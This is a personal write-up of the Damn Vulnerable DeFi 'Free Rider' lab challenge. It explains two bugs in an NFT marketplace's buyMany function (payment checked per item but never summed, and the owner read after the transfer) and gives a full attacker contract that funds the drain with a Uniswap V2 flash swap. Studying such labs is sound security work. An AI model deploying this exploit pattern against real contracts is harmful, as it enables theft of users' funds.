# Free Rider Notes(wrote by myself)
- related files: src/free-rider/FreeRiderNFTMarketplace.sol,test/free-rider/FreeRider.t.sol
---
### 1. Bug = 2 bugs in buyMany/_buyOne: (A) msg.value checked per-NFT but never summed/deducted, (B) ownerOf read AFTER transfer -> marketplace pays the buyer

### 2. where? =
- damn-vulnerable-defi/src/free-rider/FreeRiderNFTMarketplace.sol (91-111) `_buyOne` (called in a loop by `buyMany`, 83-89)

### 3. leaks reason?
- BUG A: `buyMany` loops over 6 NFTs, each calls `_buyOne` which checks `if (msg.value < priceToPay)`. `msg.value` is the ETH sent with the ONE buyMany call — it never shrinks across the loop. So sending 15 ETH once passes the check for ALL 6 (never checks the total 6*15=90). Buy all 6 for the price of one.
- BUG B: `_buyOne` transfers the NFT to the buyer FIRST (line 105), THEN pays `ownerOf(tokenId)` (line 108). But after line 105 the owner IS the buyer -> marketplace pays ME 15 ETH per NFT = 90 ETH back.
- analogy: toko ngecek "lo pegang 15 eth gak?" tiap barang, tapi gak pernah NARIK duitnya. gw tunjukin 15 eth yg sama 6x, bawa pulang 6 barang. parahnya, dia malah bayar ke PEMILIK BARU (=gw) bukan penjual.
```solidity
    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) revert TokenNotOffered(tokenId);
        if (msg.value < priceToPay) revert InsufficientPayment(); // BUG A: never deducts, msg.value fixed
        --offersCount;
        DamnValuableNFT _token = token;
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); // owner now = buyer
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);                // BUG B: pays the buyer
        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```

### 4. how we breach it :
```solidity
// player only has 0.1 ETH but needs 15 to start -> Uniswap V2 FLASH SWAP (borrow, repay same tx).
// pool calls uniswapV2Call back on us -> need an attacker contract.
contract FreeRiderAttacker is IERC721Receiver {
    // ...state: pair, marketplace, recovery, nft, weth, player; NFT_PRICE = 15 ether...

    function attack() external {
        // borrow 15 WETH (token0). non-empty data => pool calls uniswapV2Call back
        pair.swap(NFT_PRICE, 0, address(this), "x");
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        weth.withdraw(amount0);                               // a. unwrap 15 WETH -> ETH
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) ids[i] = i;
        marketplace.buyMany{value: NFT_PRICE}(ids);           // b. buy all 6 for 15, get 90 ETH back
        for (uint256 i = 0; i < 6; i++)                        // c. ship 6 NFTs to recovery
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(player)); // 6th -> 45 ETH bounty to player
        uint256 repay = (amount0 * 1000) / 997 + 1;          // d. repay borrowed + 0.3% fee
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);
        payable(player).call{value: address(this).balance}(""); // e. forward leftover to player
    }

    // REQUIRED: buyMany's line 105 safeTransferFrom sends NFTs INTO this contract -> must answer
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable {}
}
```

### 5. related shit (bonus) :
- Flash swap = Uniswap V2 lets you take tokens out FIRST, pay back (+0.3% fee) by end of the same tx, else it reverts. Free money for an atomic exploit if you don't actually need upfront capital.
- Bug B is a "stale/wrong state read" — reading `ownerOf` after mutating ownership. Classic: always cache the value you need BEFORE the state change (here, cache the seller before transferring).
- Audit heuristic (my own): functions that MOVE value/assets (buyMany) = check first. view/pure = low priority.
